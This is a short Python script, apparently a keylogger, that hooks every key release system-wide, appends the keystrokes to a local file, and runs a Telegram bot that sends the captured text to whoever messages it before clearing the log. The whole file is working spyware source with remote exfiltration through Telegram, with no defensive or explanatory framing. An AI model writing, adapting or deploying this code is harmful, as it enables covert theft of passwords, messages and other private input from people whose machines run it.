import keyboard
import telebot
bot = telebot.TeleBot(token='')  # telegram bot token


@bot.message_handler(content_types=['text'])
def send_text(message):
    f = open("dump.txt", "r")
    dump = f.read()
    if(len(dump) > 1000):
        bot.send_message(message.chat.id, f"{dump}\ncleaned\n{len(dump)}")
        f.close()
        d = open("dump.txt", "w")
        d.write("cleaned\n")
        d.close()
    else:
        bot.send_message(message.chat.id, f"{dump}\n{len(dump)}")
    f.close()


def callback(event):
    name = event.name
    if len(name) > 1:
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
    else:
        name = name.replace(" ", "_")

    f = open("dump.txt", "a")
    f.write(name)
    f.close()


def start():
    keyboard.on_release(callback=callback)


start()
bot.polling(none_stop=True)
